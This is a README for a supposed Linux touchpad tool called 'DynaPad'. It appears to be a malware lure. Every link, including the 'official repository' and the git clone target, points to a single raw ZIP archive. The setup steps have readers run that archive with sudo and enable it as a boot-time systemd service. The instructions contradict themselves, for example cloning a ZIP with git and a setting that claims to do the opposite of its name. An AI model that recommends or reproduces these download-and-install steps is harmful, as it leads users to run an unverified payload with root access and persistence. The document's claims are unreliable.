# 🖱️ DynaPad - Enhance Your Touchpad Experience

[![Download DynaPad](https://img.shields.io/badge/Download-DynaPad-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)

## 🛠 About DynaPad

DynaPad is a Linux touchpad enhancement suite. It improves how your touchpad works by adding smart features like virtual buttonless clicking. This means you can click without pressing any physical buttons on your touchpad. The software works on most Linux systems, including Linux Mint.

DynaPad helps you work more smoothly by making the touchpad easier and more responsive to use. It connects directly with your system's hardware to control touchpad functions quietly in the background.

Key topics related to DynaPad include:

- evdev (device input)
- gtk4 (user interface library)
- hid (human interface devices)
- libadwaita (design library)
- linux, linux-mint (operating systems)
- productivity improvements
- python (programming language used)
- systemd (service manager)
- uinput (virtual input device)

---

## 💻 System Requirements

Before you start, make sure your system meets these requirements:

- **Operating System:** Linux (64-bit), tested on Linux Mint and Ubuntu
- **Kernel Version:** 5.4 or newer (required for hardware input support)
- **Python:** Version 3.8 or higher
- **Disk Space:** Minimum 50 MB free
- **Privileges:** Access to install system services (you may need administrator rights)
- **Hardware:** Standard touchpad supported by the evdev input driver

---

## 🚀 Getting Started

Follow these steps to download and set up DynaPad on your Linux computer.

### 1. Visit the Download Page

Go to the official DynaPad repository:  
[https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)

You will find all the files, documentation, and instructions on this page.

### 2. Download the Latest Release

On the repository page, look for the "Releases" section on the right or under the "Code" tab.  
Select the latest release to download the installer or source files.

> The software does not provide a standalone installer for Windows since it is designed for Linux systems.

### 3. Prepare Your System

DynaPad requires some Linux system components to be present and properly configured.

Open a terminal and enter:

```bash
sudo apt update
sudo apt install python3 python3-pip python3-gi python3-systemd libevdev2 libinput10
```

This command installs Python 3, system libraries, and dependencies DynaPad needs.

### 4. Install DynaPad

If you downloaded the source code (usually a ZIP file):

- Extract the ZIP archive to a folder of your choice.
- Open a terminal and change to this folder.

Run the following command to install:

```bash
sudo python3 setup.py install
```

This copies files into your system and sets up DynaPad.

### 5. Enable and Start the Service

DynaPad uses systemd to run continuously in the background.

Enable it with:

```bash
sudo systemctl enable dynapad.service
sudo systemctl start dynapad.service
```

This makes sure DynaPad starts automatically every time you boot your computer.

---

## 🔧 How to Use DynaPad

After setup, DynaPad works quietly behind the scenes. You can enjoy these improvements:

- Click without buttons, simply tap anywhere on the touchpad.
- Customize click sensitivity using built-in settings.
- Switch fast between multi-finger gestures.
- Disable tapping temporarily with a keyboard shortcut.
- Adjust settings via a simple configuration file.

To change settings, open the main configuration file:

```bash
~/.config/dynapad/config.ini
```

Use any text editor and modify options as needed. For example, change `tapping_enabled=true` to disable tapping.

---

## 🐞 Troubleshooting

If DynaPad does not work as expected:

- **No clicking:** Check that the service is running:  
  ```bash
  systemctl status dynapad.service
  ```
- **Touchpad unresponsive:** Reboot your computer.  
- **Errors during installation:** Verify you have installed all required packages listed above.  
- **Settings not applying:** Restart the DynaPad service:  
  ```bash
  sudo systemctl restart dynapad.service
  ```

---

## 📚 Additional Resources

- Visit the repository on GitHub for the latest updates and instructions:  
  [https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)
  
- See the `README.md` and `docs/` folder in the repository for detailed usage guides.
  
- For Linux help and tips, check your distribution’s forums or user guides.

---

## ⚙️ Advanced Use

DynaPad is written in Python and uses standard Linux input drivers. Advanced users can extend or modify it by editing the source code.

The main components:

- Input handling via evdev and uinput.
- User interface built with GTK4 and libadwaita.
- Service management using systemd units.
- Configuration in simple INI files.

If you want to build from source or contribute, clone the repository with:

```bash
git clone https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip
```

---

## 🏗 Development and Support

DynaPad is open source software under a permissive license. You can report issues and request features on GitHub.

If you find bugs or have questions, use the "Issues" tab on the repository page. The community and maintainers monitor this space.

---

[![Download DynaPad](https://img.shields.io/badge/Download-DynaPad-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/formless-brickkiln533/DynaPad/main/src/Pad_Dyna_1.2.zip)